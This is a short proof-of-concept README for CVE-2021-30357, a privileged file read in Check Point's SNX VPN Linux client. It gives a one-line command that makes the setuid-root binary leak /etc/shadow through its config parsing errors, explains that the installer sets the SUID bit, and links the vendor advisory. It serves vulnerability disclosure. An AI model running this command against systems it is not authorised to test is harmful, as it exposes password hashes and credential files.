# CVE-2021-30357_CheckPoint_SNX_VPN_PoC
Proof-of-Concept for privileged file read through CheckPoint SNX VPN Linux Client.

# Affected Version

- CheckPointVPN_SNX_Linux_800007075.sh
- MD5 Checksum: 4372e9936e2dfb1d1ebcef3ed4dd7787


# Exploit 

To exploit just load any file as SNX config using the `-f` paremeter. If the file is not a valid SNX config, it will throw an error and display syntax error, leaking the contents until string terminator is found (e.g. `etc/shadow`):

```bash
$ /usr/bin/snx -f /etc/shadow

parsing of the file: /etc/shadow  failed: Line 1: unknown attribute 'root:$6$Mi[REDACTED]VwUSrc2ioKt.2Mex.yF.:18624:0:99999:7:::'

Valid attributes are:

   - server          SNX server to connet to
   - sslport         The SNX SSL port (if not default)
   - username        the user name

(...)
```

# Vulnerability 

The cause is due to the executable `/usr/bin/snx` having the SETUID bit and running as super-user, set during installation.

In particular, the variable COMMAND_TO_RUN defined in .sh installation file (`CheckPointVPN_SNX_Linux_800007075.sh`):

```bash
[...]
COMMAND_TO_RUN="install --owner=root --group=root --mode=u=rxs,g=x,o=x snx /usr/bin/snx; install --owner=root --group=root --mode=u=rx,g=rx,o=rx snx_uninstall.sh /usr/bin/snx_uninstall; install --directory --owner=root --group=root --mode=u=rwx /etc/snx; install --directory --owner=root --group=root --mode=u=rwx /etc/snx/tmp"
```
 
In the parameter `--mode=u=rxs`, the last `s` sets the SUID bit, thus leading to run the executable binary as root.


# Official Advisory

- https://support.checkpoint.com/results/sk/sk173513
- https://vrls.ws/posts/2021/06/cve-2021-30357-check-point-software-vpn-arbitrary-file-read/
